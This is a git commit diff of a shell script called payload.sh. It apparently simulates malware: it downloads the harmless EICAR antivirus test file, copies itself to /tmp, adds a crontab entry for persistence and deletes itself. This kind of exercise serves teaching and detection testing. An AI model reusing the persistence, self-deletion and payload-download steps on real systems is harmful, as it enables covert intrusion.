55b0442fa6586d7a3fe5eb033dccc198bf516e32
b4ldrrr <artelia.yeve@gmail.com>
2024-06-24 13:43:43 +0200

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,5 +1,8 @@
 #!/bin/sh
 
+#Téléchargement charge malveillante
+wget 'https://secure.eicar.org/eicar.com.txt'
+
 #Persistance
 cp ./payload.sh /tmp/payload.sh
 crontab -l > mycron
@@ -8,5 +11,3 @@ crontab mycron
 rm mycron
 rm ./payload.sh
 
-#Téléchargement charge malveillante
-wget 'https://secure.eicar.org/eicar.com.txt'
